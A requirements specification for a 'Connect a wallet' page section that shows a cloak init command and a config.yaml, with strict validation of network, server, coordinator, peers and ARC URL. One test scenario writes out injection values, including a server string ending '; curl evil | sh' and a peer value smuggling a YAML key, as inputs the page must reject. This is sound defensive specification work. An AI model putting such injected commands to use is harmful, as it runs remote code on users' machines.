## ADDED Requirements

### Requirement: Connecting a wallet
When `/api/pool`'s `wallet` is not null, the page SHALL show, under "Connect a wallet" at the anchor `connect`, the command `cloak init --network <network> --server <server> --pool <coordinator>`, and the complete `config.yaml` (cloak's config version 1, with cloak's defaults) naming the network, the server, the coordinator, the peers under `chain.peers`, and the ARC URL under `arc.url` (or `~` when none is given), introduced as the file to replace a new wallet's `config.yaml` with. No key SHALL appear twice in it. Each block SHALL have a copy button that puts exactly the block's text on the clipboard. The section SHALL render nothing unless:
- the network is one of `testnet`, `mainnet` or `regtest`;
- the server matches `/ip4/<dotted quad>` or `/ip6/<hex and colons>`, then `/udp/<port>/udx/p2p/<base58 peer id>`, with nothing else;
- the coordinator is a base58 peer id;
- each peer is an IPv4 dotted quad or a host name, then `:` and a port from 1 to 65535, with at most 8 peers;
- the ARC URL, when given, is an `https` URL with no whitespace, quotes, backslashes or shell metacharacters.

When `wallet` is null, the section SHALL not appear.

#### Scenario: The command a user pastes
- **WHEN** the pool's `wallet` names a testnet server, a coordinator, three peers and an ARC URL
- **THEN** the command reads `cloak init --network testnet --server <server> --pool <coordinator>`, and the file, read by cloak 0.1.0's `CloakConfig.load`, gives the same server, coordinator, peers and ARC URL, with cloak's defaults for everything else

#### Scenario: A value that is not what it claims
- **WHEN** `wallet.server` is `/ip4/1.2.3.4/udp/55223/udx/p2p/12D3KooW…; curl evil | sh`, or the ARC URL is `http://…` or contains a space or a `$`, or a peer is `1.2.3.4:18333\n  evil: yes`
- **THEN** the section does not render

#### Scenario: Copying
- **WHEN** the user presses a block's copy button
- **THEN** the clipboard holds that block's text exactly, and the button says it was copied

#### Scenario: Not named
- **WHEN** `wallet` is null
- **THEN** there is no "Connect a wallet" section and no `connect` anchor target
